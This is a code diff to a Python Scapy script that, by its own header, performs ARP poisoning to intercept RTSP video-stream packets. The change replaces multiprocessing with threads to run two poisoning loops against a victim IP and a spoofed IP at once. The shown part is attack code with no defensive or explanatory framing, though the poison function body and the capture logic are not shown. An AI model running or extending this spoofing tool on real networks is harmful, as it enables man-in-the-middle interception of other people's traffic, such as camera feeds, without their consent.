@@ -1,6 +1,6 @@
 # Scapy ARP poisoning to intercept RTSP packets
 
-from multiprocessing import Process
+from threading import Thread
 from scapy.all import Ether, ARP, getmacbyip, conf, get_if_addr, get_if_hwaddr, sendp, sniff
 import sys
 import os
@@ -49,6 +49,9 @@ if __name__ == "__main__":
     def poison_spoof():
         poison(attacker_iface, attacker_mac, spoof_ip, spoof_mac, victim_ip)
 
+    t1 = Thread(target=poison_victim)
+    t2 = Thread(target=poison_spoof)
+
     print("Poisoning ARP table...")
-    Process(target=poison_victim).start()
-    Process(target=poison_spoof).start()
+    t1.start()
+    t2.start()
